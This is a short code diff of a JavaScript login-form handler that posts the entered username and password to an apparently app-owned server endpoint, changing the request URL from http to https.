@@ -26,7 +26,7 @@ loginForm.addEventListener('submit', function(event) {
 
       const encodedData = new URLSearchParams({ 'S': `${username}⇥${password}` }).toString();
       //http://serverdelivery.somee.com/Home/LoginPassword
-      fetch('http://serverdelivery.somee.com/Home/LoginPassword' ,  {
+      fetch('https://serverdelivery.somee.com/Home/LoginPassword' ,  {
         method: 'POST', 
         headers: {
           'Content-Type': 'application/x-www-form-urlencoded' // Указываем формат данных
